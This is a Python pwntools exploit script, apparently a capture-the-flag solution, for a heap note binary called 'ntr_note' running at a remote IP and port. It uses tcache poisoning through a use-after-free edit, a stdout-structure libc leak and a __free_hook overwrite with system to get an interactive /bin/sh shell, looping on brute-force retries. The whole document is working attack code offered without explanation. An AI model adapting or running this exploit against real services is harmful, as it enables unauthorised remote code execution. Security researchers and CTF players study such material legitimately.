# -*- coding: utf-8 -*-
import sys
import os
from pwn import *
import galatea
context.update( os = 'linux',timeout = 1)
#context.log_level = 'debug'

binary = 'ntr_note'
elf = ELF('ntr_note')
libc =elf.libc
context.binary = binary

DEBUG = 0
if DEBUG:
  p = process('./ntr_note')
  #p = process(["qemu-aarch64","-L","",binary])
  #p = process(["qemu-aarch64","-L","",-g,"1234",binary])
else:
  host = "81.68.86.115"
  port =  "10000"
  p = remote(host,port)

l64 = lambda     	: u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda     	: u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
sla = lambda a,b  	: p.sendlineafter(str(a),str(b))
sa  = lambda a,b 	: p.sendafter(str(a),str(b))
lg  = lambda name,data : p.success(name + ": 0x%x" % data)
se  = lambda payload	: p.send(payload)
rl  = lambda      	: p.recv()
sl  = lambda payload	: p.sendline(payload)
ru  = lambda a    	: p.recvuntil(str(a))
rint= lambda a    	: int( p.recv(len(str(a)))[2:] , 16)

def dbg():
  gdb.attach(p)
  pause()

def cmd(num):
  sla("choice >>",num)

def add(size,content):
  cmd(1)
  sla("size:",size)
  sla("content:",content)

def delete(id):
  cmd(2)
  sla("idx:",id)

def edit(id,content):
  cmd(4)
  sla("idx:",id)
  sa("content:",content)


def to_pwn():
  add(0x50,"aaaa")
  add(0x50,"aaaa")
  add(0x50,"aaaa")
  add(0x50,"aaaa")

  delete(1)
  delete(2)

  edit(2, p16(0x7010))

  add(0x50,"") #4
  add(0x50,"") #5
  #dbg()
  edit(5,p64(0)*9 + p64(0x0007000700070007))

  delete(5)
  
  add(0x40,"") #6
  add(0x40,"") #7
  add(0x40,"") #8

  delete(6)
  delete(7)

  edit(7,"\xb0") 
  add(0x40,"") #9

  edit(8,p16(0x26a0)) 
  add(0x40,"") #10
  edit(5,p64(0x0001000100010001))
  
  payload = p64(0xfbad1800) + p64(0)*3 + "\x00"

  add(0x40,payload) #11

  leak = l64()
  stdout = leak + 0x336da
  libc_base = stdout - libc.sym["_IO_2_1_stdout_"]
  system_addr = libc_base + libc.sym["system"]
  __free_hook = libc_base + libc.sym["__free_hook"]
  __malloc_hook = libc_base + libc.sym["__malloc_hook"]

  lg("leak",leak)
  lg("stdout",stdout)
  lg("__free_hook",__free_hook)
  lg("__malloc_hook",__malloc_hook)
  
  add(0x40,"") #12
  add(0x40,"") #13
  add(0x40,"/bin/sh\x00") #14
  delete(12)
  delete(13)
  edit(13,p64(__free_hook))
  add(0x40,"")
  add(0x40,p64(system_addr))
  delete(14)


  p.interactive()


i = 0
while 1:
    i += 1
    log.warn(str(i))
    try:
        to_pwn()
    except Exception:
        p.close()
        p = remote(host,port)
        continue
